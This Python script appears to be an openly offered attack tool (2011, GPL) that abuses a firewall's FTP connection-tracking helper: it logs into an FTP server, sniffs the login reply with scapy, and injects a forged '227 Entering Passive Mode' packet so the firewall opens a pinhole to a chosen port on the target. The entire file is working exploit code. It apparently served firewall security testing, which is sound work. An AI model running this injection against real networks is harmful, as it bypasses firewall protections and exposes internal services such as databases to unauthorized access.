#!/usr/bin/env python
#
# Copyright 2011 Eric Leblond <eric@regit.org>
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import os,sys
import re

import threading
import argparse

from scapy.all import *

import ftplib
from time import sleep

class attack_target:
    def __init__(self):
        self.ip = "192.168.2.2"
        self.port = "5432"
        self.iface="eth0"
        self.sent = 0
        self.verbose = False

class ftp_helper(attack_target):
    def build_227_command(self):
        return "227 Entering Passive Mode (%s,%d,%d)\r\n" % (self.ip.replace('.',','), self.port >> 8 & 0xff, self.port & 0xff)

    def build_filter(self):
        return "tcp and src host %s and src port 21" % (self.ip)

    def ftp_from_server_callback(self, pkt):
        # match for login ok
        if self.sent == 0 and re.match("230",pkt.sprintf("%TCP.payload%")):
            if self.verbose:
                print "Working on following base"
                print pkt.show()
            # set ether pkt src as dst
            orig_src = pkt[Ether].src
            orig_dst = pkt[Ether].dst
            # change payload
            att = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)/IP()/TCP()
            att[IP] = pkt[IP]
            att[IP].id = pkt[IP].id + 1
            del att[IP].chksum
            del att[IP].len
            att[TCP].seq = pkt[TCP].seq + 48
            del att[TCP].chksum
            att[TCP].payload = self.build_227_command()
            # send packet
            if self.verbose:
                print "Sending attack packet"
                print att.show()
                sendp(att, iface=self.iface)
            else:
                sendp(att, iface=self.iface, verbose=0)
            self.sent = 1
            self.cv.acquire()
            self.cv.notify()
            self.cv.release()
            sys.exit(0)
          
    def ftp_connect(self, option=''):
        self.cv.acquire()
        sleep(1)
        if self.verbose:
            print "Starting ftp connection"
        ftp = ftplib.FTP(self.ip)
        ftp.login("anonymous", "opensvp")
        self.cv.wait()
        self.cv.release()

    def run(self):
        self.cv = threading.Condition()
        conn = threading.Thread(None, self.ftp_connect, args=(self,))
        conn.start()
        sniff(iface=ftptarget.iface, prn=ftptarget.ftp_from_server_callback, filter=ftptarget.build_filter(), store=0)

parser = argparse.ArgumentParser(description='Open selected pin hole in firewall')
parser.add_argument('-s', '--server', default='192.168.2.2', help='IP address of server to attack')
parser.add_argument('-i', '--iface', default='eth0', help='Interface to use for sniffing communication')
parser.add_argument('-p', '--port', default=5432, help='Target port that should be open on server after attack')
parser.add_argument('-v', '--verbose', default=False, action="store_true", help="Show verbose output")
parser.add_argument('--helper', default='ftp', help='Protocol and helper to attack (default to ftp)')
args = parser.parse_args()

# if not root...kick out
if not os.geteuid()==0:
    sys.exit("\nOnly root can run this script\n")

if args.helper == 'ftp':
    ftptarget = ftp_helper()
    ftptarget.ip = args.server
    ftptarget.iface = args.iface
    ftptarget.port = int(args.port)
    ftptarget.verbose = args.verbose
    ftptarget.run()
else:
    sys.exit("Selected protocol is currently unsupported")
